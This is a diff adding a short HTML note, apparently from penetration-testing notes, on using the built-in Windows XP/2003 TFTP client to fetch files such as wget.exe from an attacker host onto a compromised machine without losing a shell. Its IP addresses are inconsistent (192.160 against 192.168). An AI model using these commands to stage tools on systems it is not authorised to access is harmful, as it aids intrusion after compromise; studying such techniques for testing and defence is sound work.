@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>TFTP</title>
+</head><body>Works by default on:<br/>
+Windows XP<br/>
+Windows 2003<br/>
+<br/>
+A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell.<br/>
+<br/>
+You can upload and download whatever from the windows-machine like this<br/>
+tftp -i 192.160.1.101 GET wget.exe<br/>
+<br/>
+If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way.<br/>
+tftp 192.160.1.101<br/>
+GET test.txt<br/>
+<br/>
+I usually put all files I want to make available in /srv/tftp<br/>
+If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this:<br/>
+grep 192.168.1.101 /var/log/syslog</body></html>
